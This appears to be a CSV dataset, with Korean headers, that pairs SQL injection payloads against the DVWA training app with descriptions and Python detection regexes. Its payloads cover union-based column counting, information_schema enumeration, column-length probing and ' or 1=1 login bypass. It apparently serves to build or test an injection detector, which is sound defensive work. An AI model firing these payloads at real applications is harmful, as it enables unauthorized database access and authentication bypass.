injection,공격 유형,설명,탐지 정규식
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=1) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"44' union select 1, 2, 3, 4, 5, 6, 7, 8 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
42' or 1=1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1, table_name from information_schema.tables #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"13' union select 1, 2 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1,database() #",UNION 기반 정보 검색,현재 사용 중인 데이터베이스의 이름을 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?database\\(\\)"", re.IGNORECASE)"
"26' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=2) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=7) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=9) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=6) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"20' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"20' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"36' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"7' union select 1, table_name from information_schema.tables #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"76' union select 1,column_name from information_schema.columns where table_name='guestbook' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
